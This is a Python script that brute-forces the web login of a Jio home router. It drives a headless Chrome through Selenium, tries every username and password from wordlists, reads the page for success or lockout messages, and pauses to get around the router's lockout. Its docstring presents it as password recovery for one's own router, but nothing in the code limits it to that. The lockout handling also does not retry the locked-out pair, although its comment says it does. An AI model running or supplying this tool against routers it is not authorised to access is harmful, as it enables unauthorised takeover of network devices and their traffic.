"""
Jio Router Login Brute-Forcer (Selenium + Auto ChromeDriver)
Recovers admin password without factory reset.
"""

import os
import sys
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# === CONFIGURATION ===
ROUTER_URL = os.getenv("ROUTER_URL", "http://192.168.29.1")
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"
TIMEOUT_SECONDS = 600  # Lockout duration
MAX_ATTEMPTS_BEFORE_PAUSE = 5  # Adjust based on router (usually 3–5)

# Validate files
if not os.path.isfile(USERNAME_FILE):
    print(f"Error: {USERNAME_FILE} not found!")
    sys.exit(1)
if not os.path.isfile(PASSWORD_FILE):
    print(f"Error: {PASSWORD_FILE} not found!")
    sys.exit(1)

# Load credentials
def load_list(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

usernames = load_list(USERNAME_FILE)
passwords = load_list(PASSWORD_FILE)

if not usernames or not passwords:
    print("Error: Username or password list is empty!")
    sys.exit(1)

print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
print(f"Target: {ROUTER_URL}")
print(f"Lockout: {TIMEOUT_SECONDS}s after {MAX_ATTEMPTS_BEFORE_PAUSE} failed attempts\n")

# === SETUP SELENIUM ===
options = webdriver.ChromeOptions()
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-gpu')
options.add_argument('--window-size=1920,1080')

# Auto-download ChromeDriver
print("Downloading ChromeDriver (if needed)...")
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=options)

# === LOGIN FUNCTION ===
def try_login(username, password):
    try:
        driver.get(ROUTER_URL)
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "users.username"))
        )

        # Fill form
        driver.find_element(By.NAME, "users.username").clear()
        driver.find_element(By.NAME, "users.username").send_keys(username)
        driver.find_element(By.NAME, "users.password").clear()
        driver.find_element(By.NAME, "users.password").send_keys(password)
        driver.find_element(By.NAME, "button.login.users.dashboard").click()

        # === LOCKOUT DETECTION ===
        try:
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located(
                    (By.XPATH, "//*[contains(text(), 'Access denied, maximum login attempts reached')]")
                )
            )
            print(f"LOCKOUT: {username}/{password} → Waiting {TIMEOUT_SECONDS}s")
            return "lockout"
        except TimeoutException:
            pass

        # === FAILURE DETECTION ===
        try:
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "div.msgError p"))
            )
            error = driver.find_element(By.CSS_SELECTOR, "div.msgError p").text
            if "Invalid username or password" in error:
                print(f"Failed: {username}/{password}")
                return False
        except TimeoutException:
            pass

        # === SUCCESS DETECTION ===
        try:
            WebDriverWait(driver, 10).until(EC.url_changes(ROUTER_URL))
            print(f"SUCCESS! → Username: {username} | Password: {password}")
            return True
        except TimeoutException:
            pass

        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located(
                    (By.XPATH, "//*[contains(text(), 'Dashboard') or contains(text(), 'Settings') or contains(text(), 'Status') or contains(text(), 'Management')]")
                )
            )
            print(f"SUCCESS! → Username: {username} | Password: {password} (Dashboard)")
            return True
        except TimeoutException:
            print(f"Ambiguous: {username}/{password} → No clear success/failure")
            return False

    except Exception as e:
        print(f"Error [{username}/{password}]: {str(e)}")
        return False


# === MAIN LOOP ===
attempt_count = 0
success = False

try:
    for username in usernames:
        for password in passwords:
            if success:
                break
            attempt_count += 1
            print(f"[{attempt_count}] Trying → {username} : {password}")

            result = try_login(username, password)

            if result is True:
                success = True
                print("\nSUCCESS! Login credentials found.")
                print(f"Username: {username}")
                print(f"Password: {password}")
                print("Log in now and change the password + backup settings!")
                break
            elif result == "lockout":
                print(f"Pausing for {TIMEOUT_SECONDS} seconds...")
                sleep(TIMEOUT_SECONDS)
                attempt_count -= 1  # Retry same combo
                continue
            else:
                # Pause every N attempts
                if attempt_count % MAX_ATTEMPTS_BEFORE_PAUSE == 0:
                    print(f"Pause: {TIMEOUT_SECONDS}s to avoid lockout...")
                    sleep(TIMEOUT_SECONDS)
                else:
                    sleep(2)

except KeyboardInterrupt:
    print("\nStopped by user.")

finally:
    driver.quit()
    if not success:
        print("\nNo valid credentials found. Try:")
        print("  • Adding more passwords (mobile, install date, etc.)")
        print("  • Contact Jio Support: 1800-889-9999")